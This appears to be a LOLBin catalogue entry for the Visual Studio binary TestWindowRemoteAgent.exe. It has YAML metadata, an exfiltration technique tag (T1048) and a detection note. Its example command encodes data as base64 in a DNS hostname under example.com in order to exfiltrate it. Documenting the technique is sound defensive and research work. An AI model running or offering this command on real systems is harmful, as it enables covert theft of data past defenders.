---
id: windows-upload-testwindowremoteagent
namespace: windows:upload:testwindowremoteagent
name: testwindowremoteagent
description: 'TestWindowRemoteAgent.exe is the command-line tool to establish RPC Located at: C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe.'
author: Onat Uzunyayla
version: 1.0.0
capabilities:
- network.transfer.upload
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- testwindowremoteagent
parameters: []
features: []
execution:
  template: testwindowremoteagent
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Sends DNS query for open connection to any host, enabling exfiltration over DNS (Attackers may utilize this to exfiltrate data over DNS)
  command: TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
references: []
techniques:
- exfiltration
mitre_ids:
- T1048
detections:
- type: ioc
  description: TestWindowRemoteAgent.exe spawning unexpectedly
install:
- method: choco
  package_name: testwindowremoteagent
  commands:
  - choco install testwindowremoteagent
---


# testwindowremoteagent

testwindowremoteagent is a Windows LOLBin. TestWindowRemoteAgent.exe is the command-line tool to establish RPC Located at: C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe.
